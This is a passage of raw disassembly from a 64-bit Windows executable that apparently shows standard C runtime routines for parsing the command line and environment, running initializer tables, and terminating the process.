   14000562e:	48 8d 1d 8b 46 01 00 	lea    0x1468b(%rip),%rbx        # 0x140019cc0
   140005635:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000563b:	48 8b d3             	mov    %rbx,%rdx
   14000563e:	33 c9                	xor    %ecx,%ecx
   140005640:	ff 15 da 9a 00 00    	call   *0x9ada(%rip)        # 0x14000f120
   140005646:	48 8b 35 43 49 01 00 	mov    0x14943(%rip),%rsi        # 0x140019f90
   14000564d:	48 89 1d 14 49 01 00 	mov    %rbx,0x14914(%rip)        # 0x140019f68
   140005654:	48 85 f6             	test   %rsi,%rsi
   140005657:	74 05                	je     0x14000565e
   140005659:	66 39 3e             	cmp    %di,(%rsi)
   14000565c:	75 03                	jne    0x140005661
   14000565e:	48 8b f3             	mov    %rbx,%rsi
   140005661:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140005665:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   140005669:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   14000566d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005672:	45 33 c0             	xor    %r8d,%r8d
   140005675:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140005679:	33 d2                	xor    %edx,%edx
   14000567b:	48 8b ce             	mov    %rsi,%rcx
   14000567e:	e8 69 fd ff ff       	call   0x1400053ec
   140005683:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   140005687:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000568d:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140005691:	49 8b cf             	mov    %r15,%rcx
   140005694:	e8 f7 fe ff ff       	call   0x140005590
   140005699:	48 8b d8             	mov    %rax,%rbx
   14000569c:	48 85 c0             	test   %rax,%rax
   14000569f:	75 18                	jne    0x1400056b9
   1400056a1:	e8 ae 1d 00 00       	call   0x140007454
   1400056a6:	bb 0c 00 00 00       	mov    $0xc,%ebx
   1400056ab:	33 c9                	xor    %ecx,%ecx
   1400056ad:	89 18                	mov    %ebx,(%rax)
   1400056af:	e8 38 1e 00 00       	call   0x1400074ec
   1400056b4:	e9 6e ff ff ff       	jmp    0x140005627
   1400056b9:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   1400056bd:	48 8b d3             	mov    %rbx,%rdx
   1400056c0:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400056c4:	48 8b ce             	mov    %rsi,%rcx
   1400056c7:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1400056cb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400056d0:	e8 17 fd ff ff       	call   0x1400053ec
   1400056d5:	41 83 fe 01          	cmp    $0x1,%r14d
   1400056d9:	75 16                	jne    0x1400056f1
   1400056db:	8b 45 40             	mov    0x40(%rbp),%eax
   1400056de:	ff c8                	dec    %eax
   1400056e0:	48 89 1d 99 48 01 00 	mov    %rbx,0x14899(%rip)        # 0x140019f80
   1400056e7:	89 05 83 48 01 00    	mov    %eax,0x14883(%rip)        # 0x140019f70
   1400056ed:	33 c9                	xor    %ecx,%ecx
   1400056ef:	eb 69                	jmp    0x14000575a
   1400056f1:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   1400056f5:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1400056f9:	48 8b cb             	mov    %rbx,%rcx
   1400056fc:	e8 53 24 00 00       	call   0x140007b54
   140005701:	8b f0                	mov    %eax,%esi
   140005703:	85 c0                	test   %eax,%eax
   140005705:	74 19                	je     0x140005720
   140005707:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000570b:	e8 dc 1d 00 00       	call   0x1400074ec
   140005710:	48 8b cb             	mov    %rbx,%rcx
   140005713:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005717:	e8 d0 1d 00 00       	call   0x1400074ec
   14000571c:	8b fe                	mov    %esi,%edi
   14000571e:	eb 3f                	jmp    0x14000575f
   140005720:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140005724:	48 8b cf             	mov    %rdi,%rcx
   140005727:	48 8b c2             	mov    %rdx,%rax
   14000572a:	48 39 3a             	cmp    %rdi,(%rdx)
   14000572d:	74 0c                	je     0x14000573b
   14000572f:	48 8d 40 08          	lea    0x8(%rax),%rax
   140005733:	48 ff c1             	inc    %rcx
   140005736:	48 39 38             	cmp    %rdi,(%rax)
   140005739:	75 f4                	jne    0x14000572f
   14000573b:	89 0d 2f 48 01 00    	mov    %ecx,0x1482f(%rip)        # 0x140019f70
   140005741:	33 c9                	xor    %ecx,%ecx
   140005743:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005747:	48 89 15 32 48 01 00 	mov    %rdx,0x14832(%rip)        # 0x140019f80
   14000574e:	e8 99 1d 00 00       	call   0x1400074ec
   140005753:	48 8b cb             	mov    %rbx,%rcx
   140005756:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   14000575a:	e8 8d 1d 00 00       	call   0x1400074ec
   14000575f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005764:	8b c7                	mov    %edi,%eax
   140005766:	48 83 c4 30          	add    $0x30,%rsp
   14000576a:	41 5f                	pop    %r15
   14000576c:	41 5e                	pop    %r14
   14000576e:	5f                   	pop    %rdi
   14000576f:	5e                   	pop    %rsi
   140005770:	5d                   	pop    %rbp
   140005771:	c3                   	ret
   140005772:	cc                   	int3
   140005773:	cc                   	int3
   140005774:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005779:	57                   	push   %rdi
   14000577a:	48 83 ec 20          	sub    $0x20,%rsp
   14000577e:	33 ff                	xor    %edi,%edi
   140005780:	48 39 3d 51 47 01 00 	cmp    %rdi,0x14751(%rip)        # 0x140019ed8
   140005787:	74 04                	je     0x14000578d
   140005789:	33 c0                	xor    %eax,%eax
   14000578b:	eb 4a                	jmp    0x1400057d7
   14000578d:	e8 32 30 00 00       	call   0x1400087c4
   140005792:	48 8b d8             	mov    %rax,%rbx
   140005795:	48 85 c0             	test   %rax,%rax
   140005798:	75 0c                	jne    0x1400057a6
   14000579a:	33 c9                	xor    %ecx,%ecx
   14000579c:	e8 4b 1d 00 00       	call   0x1400074ec
   1400057a1:	83 c8 ff             	or     $0xffffffff,%eax
   1400057a4:	eb 31                	jmp    0x1400057d7
   1400057a6:	48 8b cb             	mov    %rbx,%rcx
   1400057a9:	e8 36 00 00 00       	call   0x1400057e4
   1400057ae:	48 85 c0             	test   %rax,%rax
   1400057b1:	75 05                	jne    0x1400057b8
   1400057b3:	83 cf ff             	or     $0xffffffff,%edi
   1400057b6:	eb 0e                	jmp    0x1400057c6
   1400057b8:	48 89 05 21 47 01 00 	mov    %rax,0x14721(%rip)        # 0x140019ee0
   1400057bf:	48 89 05 12 47 01 00 	mov    %rax,0x14712(%rip)        # 0x140019ed8
   1400057c6:	33 c9                	xor    %ecx,%ecx
   1400057c8:	e8 1f 1d 00 00       	call   0x1400074ec
   1400057cd:	48 8b cb             	mov    %rbx,%rcx
   1400057d0:	e8 17 1d 00 00       	call   0x1400074ec
   1400057d5:	8b c7                	mov    %edi,%eax
   1400057d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400057dc:	48 83 c4 20          	add    $0x20,%rsp
   1400057e0:	5f                   	pop    %rdi
   1400057e1:	c3                   	ret
   1400057e2:	cc                   	int3
   1400057e3:	cc                   	int3
   1400057e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400057ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400057f3:	57                   	push   %rdi
   1400057f4:	41 56                	push   %r14
   1400057f6:	41 57                	push   %r15
   1400057f8:	48 83 ec 30          	sub    $0x30,%rsp
   1400057fc:	4c 8b f1             	mov    %rcx,%r14
   1400057ff:	33 ed                	xor    %ebp,%ebp
   140005801:	8b cd                	mov    %ebp,%ecx
   140005803:	4d 8b c6             	mov    %r14,%r8
   140005806:	41 0f b7 16          	movzwl (%r14),%edx
   14000580a:	eb 29                	jmp    0x140005835
   14000580c:	66 83 fa 3d          	cmp    $0x3d,%dx
   140005810:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140005814:	48 0f 44 c1          	cmove  %rcx,%rax
   140005818:	48 8b c8             	mov    %rax,%rcx
   14000581b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000581f:	48 ff c0             	inc    %rax
   140005822:	66 41 39 2c 40       	cmp    %bp,(%r8,%rax,2)
   140005827:	75 f6                	jne    0x14000581f
   140005829:	4d 8d 04 40          	lea    (%r8,%rax,2),%r8
   14000582d:	49 83 c0 02          	add    $0x2,%r8
   140005831:	41 0f b7 10          	movzwl (%r8),%edx
   140005835:	66 85 d2             	test   %dx,%dx
   140005838:	75 d2                	jne    0x14000580c
   14000583a:	48 ff c1             	inc    %rcx
   14000583d:	ba 08 00 00 00       	mov    $0x8,%edx
   140005842:	e8 2d 1c 00 00       	call   0x140007474
   140005847:	48 8b d8             	mov    %rax,%rbx
   14000584a:	48 85 c0             	test   %rax,%rax
   14000584d:	75 0b                	jne    0x14000585a
   14000584f:	33 c9                	xor    %ecx,%ecx
   140005851:	e8 96 1c 00 00       	call   0x1400074ec
   140005856:	33 c0                	xor    %eax,%eax
   140005858:	eb 79                	jmp    0x1400058d3
   14000585a:	4c 8b fb             	mov    %rbx,%r15
   14000585d:	41 0f b7 06          	movzwl (%r14),%eax
   140005861:	66 85 c0             	test   %ax,%ax
   140005864:	74 63                	je     0x1400058c9
   140005866:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   14000586a:	48 ff c6             	inc    %rsi
   14000586d:	66 41 39 2c 76       	cmp    %bp,(%r14,%rsi,2)
   140005872:	75 f6                	jne    0x14000586a
   140005874:	48 ff c6             	inc    %rsi
   140005877:	66 83 f8 3d          	cmp    $0x3d,%ax
   14000587b:	74 35                	je     0x1400058b2
   14000587d:	ba 02 00 00 00       	mov    $0x2,%edx
   140005882:	48 8b ce             	mov    %rsi,%rcx
   140005885:	e8 ea 1b 00 00       	call   0x140007474
   14000588a:	48 8b f8             	mov    %rax,%rdi
   14000588d:	48 85 c0             	test   %rax,%rax
   140005890:	74 26                	je     0x1400058b8
   140005892:	4d 8b c6             	mov    %r14,%r8
   140005895:	48 8b d6             	mov    %rsi,%rdx
   140005898:	48 8b c8             	mov    %rax,%rcx
   14000589b:	e8 c4 19 00 00       	call   0x140007264
   1400058a0:	33 c9                	xor    %ecx,%ecx
   1400058a2:	85 c0                	test   %eax,%eax
   1400058a4:	75 46                	jne    0x1400058ec
   1400058a6:	49 89 3f             	mov    %rdi,(%r15)
   1400058a9:	49 83 c7 08          	add    $0x8,%r15
   1400058ad:	e8 3a 1c 00 00       	call   0x1400074ec
   1400058b2:	4d 8d 34 76          	lea    (%r14,%rsi,2),%r14
   1400058b6:	eb a5                	jmp    0x14000585d
   1400058b8:	48 8b cb             	mov    %rbx,%rcx
   1400058bb:	e8 40 00 00 00       	call   0x140005900
   1400058c0:	33 c9                	xor    %ecx,%ecx
   1400058c2:	e8 25 1c 00 00       	call   0x1400074ec
   1400058c7:	eb 86                	jmp    0x14000584f
   1400058c9:	33 c9                	xor    %ecx,%ecx
   1400058cb:	e8 1c 1c 00 00       	call   0x1400074ec
   1400058d0:	48 8b c3             	mov    %rbx,%rax
   1400058d3:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400058d8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400058dd:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400058e2:	48 83 c4 30          	add    $0x30,%rsp
   1400058e6:	41 5f                	pop    %r15
   1400058e8:	41 5e                	pop    %r14
   1400058ea:	5f                   	pop    %rdi
   1400058eb:	c3                   	ret
   1400058ec:	45 33 c9             	xor    %r9d,%r9d
   1400058ef:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400058f4:	45 33 c0             	xor    %r8d,%r8d
   1400058f7:	33 d2                	xor    %edx,%edx
   1400058f9:	e8 1e 19 00 00       	call   0x14000721c
   1400058fe:	cc                   	int3
   1400058ff:	cc                   	int3
   140005900:	48 85 c9             	test   %rcx,%rcx
   140005903:	74 3b                	je     0x140005940
   140005905:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000590a:	57                   	push   %rdi
   14000590b:	48 83 ec 20          	sub    $0x20,%rsp
   14000590f:	48 8b 01             	mov    (%rcx),%rax
   140005912:	48 8b d9             	mov    %rcx,%rbx
   140005915:	48 8b f9             	mov    %rcx,%rdi
   140005918:	eb 0f                	jmp    0x140005929
   14000591a:	48 8b c8             	mov    %rax,%rcx
   14000591d:	e8 ca 1b 00 00       	call   0x1400074ec
   140005922:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140005926:	48 8b 07             	mov    (%rdi),%rax
   140005929:	48 85 c0             	test   %rax,%rax
   14000592c:	75 ec                	jne    0x14000591a
   14000592e:	48 8b cb             	mov    %rbx,%rcx
   140005931:	e8 b6 1b 00 00       	call   0x1400074ec
   140005936:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000593b:	48 83 c4 20          	add    $0x20,%rsp
   14000593f:	5f                   	pop    %rdi
   140005940:	c3                   	ret
   140005941:	cc                   	int3
   140005942:	cc                   	int3
   140005943:	cc                   	int3
   140005944:	48 83 ec 28          	sub    $0x28,%rsp
   140005948:	48 8b 09             	mov    (%rcx),%rcx
   14000594b:	48 3b 0d 96 45 01 00 	cmp    0x14596(%rip),%rcx        # 0x140019ee8
   140005952:	74 05                	je     0x140005959
   140005954:	e8 a7 ff ff ff       	call   0x140005900
   140005959:	48 83 c4 28          	add    $0x28,%rsp
   14000595d:	c3                   	ret
   14000595e:	cc                   	int3
   14000595f:	cc                   	int3
   140005960:	48 83 ec 28          	sub    $0x28,%rsp
   140005964:	48 8b 09             	mov    (%rcx),%rcx
   140005967:	48 3b 0d 72 45 01 00 	cmp    0x14572(%rip),%rcx        # 0x140019ee0
   14000596e:	74 05                	je     0x140005975
   140005970:	e8 8b ff ff ff       	call   0x140005900
   140005975:	48 83 c4 28          	add    $0x28,%rsp
   140005979:	c3                   	ret
   14000597a:	cc                   	int3
   14000597b:	cc                   	int3
   14000597c:	48 83 ec 38          	sub    $0x38,%rsp
   140005980:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140005987:	ff ff 
   140005989:	48 8d 0d 40 45 01 00 	lea    0x14540(%rip),%rcx        # 0x140019ed0
   140005990:	e8 af ff ff ff       	call   0x140005944
   140005995:	90                   	nop
   140005996:	48 8d 0d 3b 45 01 00 	lea    0x1453b(%rip),%rcx        # 0x140019ed8
   14000599d:	e8 be ff ff ff       	call   0x140005960
   1400059a2:	90                   	nop
   1400059a3:	48 8b 0d 3e 45 01 00 	mov    0x1453e(%rip),%rcx        # 0x140019ee8
   1400059aa:	e8 51 ff ff ff       	call   0x140005900
   1400059af:	48 8b 0d 2a 45 01 00 	mov    0x1452a(%rip),%rcx        # 0x140019ee0
   1400059b6:	48 83 c4 38          	add    $0x38,%rsp
   1400059ba:	e9 41 ff ff ff       	jmp    0x140005900
   1400059bf:	cc                   	int3
   1400059c0:	e9 af fd ff ff       	jmp    0x140005774
   1400059c5:	cc                   	int3
   1400059c6:	cc                   	int3
   1400059c7:	cc                   	int3
   1400059c8:	48 8b 05 c1 45 01 00 	mov    0x145c1(%rip),%rax        # 0x140019f90
   1400059cf:	48 8d 0d 1a 45 01 00 	lea    0x1451a(%rip),%rcx        # 0x140019ef0
   1400059d6:	45 33 c0             	xor    %r8d,%r8d
   1400059d9:	48 85 c0             	test   %rax,%rax
   1400059dc:	41 8a d0             	mov    %r8b,%dl
   1400059df:	48 0f 45 c8          	cmovne %rax,%rcx
   1400059e3:	0f b7 01             	movzwl (%rcx),%eax
   1400059e6:	66 83 f8 20          	cmp    $0x20,%ax
   1400059ea:	77 09                	ja     0x1400059f5
   1400059ec:	66 85 c0             	test   %ax,%ax
   1400059ef:	74 27                	je     0x140005a18
   1400059f1:	84 d2                	test   %dl,%dl
   1400059f3:	74 11                	je     0x140005a06
   1400059f5:	66 83 f8 22          	cmp    $0x22,%ax
   1400059f9:	75 05                	jne    0x140005a00
   1400059fb:	84 d2                	test   %dl,%dl
   1400059fd:	0f 94 c2             	sete   %dl
   140005a00:	48 83 c1 02          	add    $0x2,%rcx
   140005a04:	eb dd                	jmp    0x1400059e3
   140005a06:	66 83 f8 20          	cmp    $0x20,%ax
   140005a0a:	77 0c                	ja     0x140005a18
   140005a0c:	48 83 c1 02          	add    $0x2,%rcx
   140005a10:	0f b7 01             	movzwl (%rcx),%eax
   140005a13:	66 85 c0             	test   %ax,%ax
   140005a16:	75 ee                	jne    0x140005a06
   140005a18:	48 8b c1             	mov    %rcx,%rax
   140005a1b:	c3                   	ret
   140005a1c:	48 3b ca             	cmp    %rdx,%rcx
   140005a1f:	74 3b                	je     0x140005a5c
   140005a21:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a26:	57                   	push   %rdi
   140005a27:	48 83 ec 20          	sub    $0x20,%rsp
   140005a2b:	48 8b fa             	mov    %rdx,%rdi
   140005a2e:	48 8b d9             	mov    %rcx,%rbx
   140005a31:	48 8b 03             	mov    (%rbx),%rax
   140005a34:	48 85 c0             	test   %rax,%rax
   140005a37:	74 10                	je     0x140005a49
   140005a39:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140005a40:	3e f1 85 
   140005a43:	ff 15 1f 98 00 00    	call   *0x981f(%rip)        # 0x14000f268
   140005a49:	48 83 c3 08          	add    $0x8,%rbx
   140005a4d:	48 3b df             	cmp    %rdi,%rbx
   140005a50:	75 df                	jne    0x140005a31
   140005a52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005a57:	48 83 c4 20          	add    $0x20,%rsp
   140005a5b:	5f                   	pop    %rdi
   140005a5c:	c3                   	ret
   140005a5d:	cc                   	int3
   140005a5e:	cc                   	int3
   140005a5f:	cc                   	int3
   140005a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a65:	57                   	push   %rdi
   140005a66:	48 83 ec 20          	sub    $0x20,%rsp
   140005a6a:	48 8b fa             	mov    %rdx,%rdi
   140005a6d:	48 8b d9             	mov    %rcx,%rbx
   140005a70:	48 3b ca             	cmp    %rdx,%rcx
   140005a73:	74 25                	je     0x140005a9a
   140005a75:	48 8b 03             	mov    (%rbx),%rax
   140005a78:	48 85 c0             	test   %rax,%rax
   140005a7b:	74 14                	je     0x140005a91
   140005a7d:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   140005a84:	27 05 d3 
   140005a87:	ff 15 db 97 00 00    	call   *0x97db(%rip)        # 0x14000f268
   140005a8d:	85 c0                	test   %eax,%eax
   140005a8f:	75 0b                	jne    0x140005a9c
   140005a91:	48 83 c3 08          	add    $0x8,%rbx
   140005a95:	48 3b df             	cmp    %rdi,%rbx
   140005a98:	eb d9                	jmp    0x140005a73
   140005a9a:	33 c0                	xor    %eax,%eax
   140005a9c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005aa1:	48 83 c4 20          	add    $0x20,%rsp
   140005aa5:	5f                   	pop    %rdi
   140005aa6:	c3                   	ret
   140005aa7:	cc                   	int3
   140005aa8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005aad:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005ab2:	57                   	push   %rdi
   140005ab3:	48 83 ec 20          	sub    $0x20,%rsp
   140005ab7:	49 8b d9             	mov    %r9,%rbx
   140005aba:	49 8b f8             	mov    %r8,%rdi
   140005abd:	8b 0a                	mov    (%rdx),%ecx
   140005abf:	e8 e4 2d 00 00       	call   0x1400088a8
   140005ac4:	90                   	nop
   140005ac5:	48 8b cf             	mov    %rdi,%rcx
   140005ac8:	e8 13 00 00 00       	call   0x140005ae0
   140005acd:	90                   	nop
   140005ace:	8b 0b                	mov    (%rbx),%ecx
   140005ad0:	e8 27 2e 00 00       	call   0x1400088fc
   140005ad5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005ada:	48 83 c4 20          	add    $0x20,%rsp
   140005ade:	5f                   	pop    %rdi
   140005adf:	c3                   	ret
   140005ae0:	40 53                	rex push %rbx
   140005ae2:	48 83 ec 30          	sub    $0x30,%rsp
   140005ae6:	48 8b d9             	mov    %rcx,%rbx
   140005ae9:	80 3d 10 44 01 00 00 	cmpb   $0x0,0x14410(%rip)        # 0x140019f00
   140005af0:	0f 85 a9 00 00 00    	jne    0x140005b9f
   140005af6:	b8 01 00 00 00       	mov    $0x1,%eax
   140005afb:	87 05 f3 43 01 00    	xchg   %eax,0x143f3(%rip)        # 0x140019ef4
   140005b01:	48 8b 01             	mov    (%rcx),%rax
   140005b04:	8b 08                	mov    (%rax),%ecx
   140005b06:	85 c9                	test   %ecx,%ecx
   140005b08:	75 3e                	jne    0x140005b48
   140005b0a:	48 8b 05 2f 35 01 00 	mov    0x1352f(%rip),%rax        # 0x140019040
   140005b11:	48 8b 15 e0 43 01 00 	mov    0x143e0(%rip),%rdx        # 0x140019ef8
   140005b18:	48 3b d0             	cmp    %rax,%rdx
   140005b1b:	74 22                	je     0x140005b3f
   140005b1d:	8b c8                	mov    %eax,%ecx
   140005b1f:	83 e1 3f             	and    $0x3f,%ecx
   140005b22:	48 33 c2             	xor    %rdx,%rax
   140005b25:	48 d3 c8             	ror    %cl,%rax
   140005b28:	49 ba 70 28 d9 78 45 	movabs $0x99012e4578d92870,%r10
   140005b2f:	2e 01 99 
   140005b32:	45 33 c0             	xor    %r8d,%r8d
   140005b35:	33 d2                	xor    %edx,%edx
   140005b37:	33 c9                	xor    %ecx,%ecx
   140005b39:	ff 15 29 97 00 00    	call   *0x9729(%rip)        # 0x14000f268
   140005b3f:	48 8d 0d ca 43 01 00 	lea    0x143ca(%rip),%rcx        # 0x140019f10
   140005b46:	eb 0c                	jmp    0x140005b54
   140005b48:	83 f9 01             	cmp    $0x1,%ecx
   140005b4b:	75 0d                	jne    0x140005b5a
   140005b4d:	48 8d 0d d4 43 01 00 	lea    0x143d4(%rip),%rcx        # 0x140019f28
   140005b54:	e8 5b 07 00 00       	call   0x1400062b4
   140005b59:	90                   	nop
   140005b5a:	48 8b 03             	mov    (%rbx),%rax
   140005b5d:	83 38 00             	cmpl   $0x0,(%rax)
   140005b60:	75 13                	jne    0x140005b75
   140005b62:	48 8d 15 97 97 00 00 	lea    0x9797(%rip),%rdx        # 0x14000f300
   140005b69:	48 8d 0d 70 97 00 00 	lea    0x9770(%rip),%rcx        # 0x14000f2e0
   140005b70:	e8 a7 fe ff ff       	call   0x140005a1c
   140005b75:	48 8d 15 94 97 00 00 	lea    0x9794(%rip),%rdx        # 0x14000f310
   140005b7c:	48 8d 0d 85 97 00 00 	lea    0x9785(%rip),%rcx        # 0x14000f308
   140005b83:	e8 94 fe ff ff       	call   0x140005a1c
   140005b88:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140005b8c:	83 38 00             	cmpl   $0x0,(%rax)
   140005b8f:	75 0e                	jne    0x140005b9f
   140005b91:	c6 05 68 43 01 00 01 	movb   $0x1,0x14368(%rip)        # 0x140019f00
   140005b98:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140005b9c:	c6 00 01             	movb   $0x1,(%rax)
   140005b9f:	48 83 c4 30          	add    $0x30,%rsp
   140005ba3:	5b                   	pop    %rbx
   140005ba4:	c3                   	ret
   140005ba5:	e8 36 09 00 00       	call   0x1400064e0
   140005baa:	90                   	nop
   140005bab:	cc                   	int3
   140005bac:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140005bb1:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140005bb5:	55                   	push   %rbp
   140005bb6:	48 8b ec             	mov    %rsp,%rbp
   140005bb9:	48 83 ec 50          	sub    $0x50,%rsp
   140005bbd:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   140005bc4:	ff 
   140005bc5:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140005bca:	8b d9                	mov    %ecx,%ebx
   140005bcc:	45 85 c0             	test   %r8d,%r8d
   140005bcf:	75 4a                	jne    0x140005c1b
   140005bd1:	33 c9                	xor    %ecx,%ecx
   140005bd3:	ff 15 9f 94 00 00    	call   *0x949f(%rip)        # 0x14000f078
   140005bd9:	48 85 c0             	test   %rax,%rax
   140005bdc:	74 3d                	je     0x140005c1b
   140005bde:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140005be3:	66 39 08             	cmp    %cx,(%rax)
   140005be6:	75 33                	jne    0x140005c1b
   140005be8:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140005bec:	48 03 c8             	add    %rax,%rcx
   140005bef:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140005bf5:	75 24                	jne    0x140005c1b
   140005bf7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140005bfc:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140005c00:	75 19                	jne    0x140005c1b
   140005c02:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140005c09:	76 10                	jbe    0x140005c1b
   140005c0b:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140005c12:	74 07                	je     0x140005c1b
   140005c14:	8b cb                	mov    %ebx,%ecx
   140005c16:	e8 bd 00 00 00       	call   0x140005cd8
   140005c1b:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   140005c1f:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140005c23:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005c27:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140005c2b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005c2f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140005c33:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005c37:	b8 02 00 00 00       	mov    $0x2,%eax
   140005c3c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140005c3f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140005c42:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   140005c46:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005c4a:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140005c4e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140005c52:	e8 51 fe ff ff       	call   0x140005aa8
   140005c57:	90                   	nop
   140005c58:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140005c5c:	74 0b                	je     0x140005c69
   140005c5e:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005c63:	48 83 c4 50          	add    $0x50,%rsp
   140005c67:	5d                   	pop    %rbp
   140005c68:	c3                   	ret
   140005c69:	8b cb                	mov    %ebx,%ecx
   140005c6b:	e8 04 00 00 00       	call   0x140005c74
   140005c70:	cc                   	int3
   140005c71:	cc                   	int3
   140005c72:	cc                   	int3
   140005c73:	cc                   	int3
   140005c74:	40 53                	rex push %rbx
   140005c76:	48 83 ec 20          	sub    $0x20,%rsp
   140005c7a:	8b d9                	mov    %ecx,%ebx
   140005c7c:	e8 27 00 00 00       	call   0x140005ca8
   140005c81:	84 c0                	test   %al,%al
   140005c83:	74 11                	je     0x140005c96
   140005c85:	ff 15 9d 94 00 00    	call   *0x949d(%rip)        # 0x14000f128
   140005c8b:	48 8b c8             	mov    %rax,%rcx
   140005c8e:	8b d3                	mov    %ebx,%edx
   140005c90:	ff 15 a2 94 00 00    	call   *0x94a2(%rip)        # 0x14000f138
   140005c96:	8b cb                	mov    %ebx,%ecx
   140005c98:	e8 3b 00 00 00       	call   0x140005cd8
   140005c9d:	8b cb                	mov    %ebx,%ecx
   140005c9f:	ff 15 8b 94 00 00    	call   *0x948b(%rip)        # 0x14000f130
   140005ca5:	cc                   	int3
   140005ca6:	cc                   	int3
   140005ca7:	cc                   	int3
   140005ca8:	48 83 ec 28          	sub    $0x28,%rsp
   140005cac:	e8 67 2c 00 00       	call   0x140008918
   140005cb1:	83 f8 01             	cmp    $0x1,%eax
   140005cb4:	74 1b                	je     0x140005cd1
   140005cb6:	65 48 8b 0c 25 60 00 	mov    %gs:0x60,%rcx
   140005cbd:	00 00 
   140005cbf:	8b 91 bc 00 00 00    	mov    0xbc(%rcx),%edx
   140005cc5:	c1 ea 08             	shr    $0x8,%edx
   140005cc8:	f6 c2 01             	test   $0x1,%dl
   140005ccb:	75 04                	jne    0x140005cd1
   140005ccd:	b0 01                	mov    $0x1,%al
   140005ccf:	eb 02                	jmp    0x140005cd3
   140005cd1:	32 c0                	xor    %al,%al
   140005cd3:	48 83 c4 28          	add    $0x28,%rsp
   140005cd7:	c3                   	ret
   140005cd8:	40 53                	rex push %rbx
   140005cda:	48 83 ec 30          	sub    $0x30,%rsp
   140005cde:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140005ce5:	ff ff 
   140005ce7:	8b d9                	mov    %ecx,%ebx
   140005ce9:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140005cef:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140005cf4:	48 8d 15 c5 a7 00 00 	lea    0xa7c5(%rip),%rdx        # 0x1400104c0
   140005cfb:	33 c9                	xor    %ecx,%ecx
   140005cfd:	ff 15 3d 94 00 00    	call   *0x943d(%rip)        # 0x14000f140
   140005d03:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140005d08:	85 c0                	test   %eax,%eax
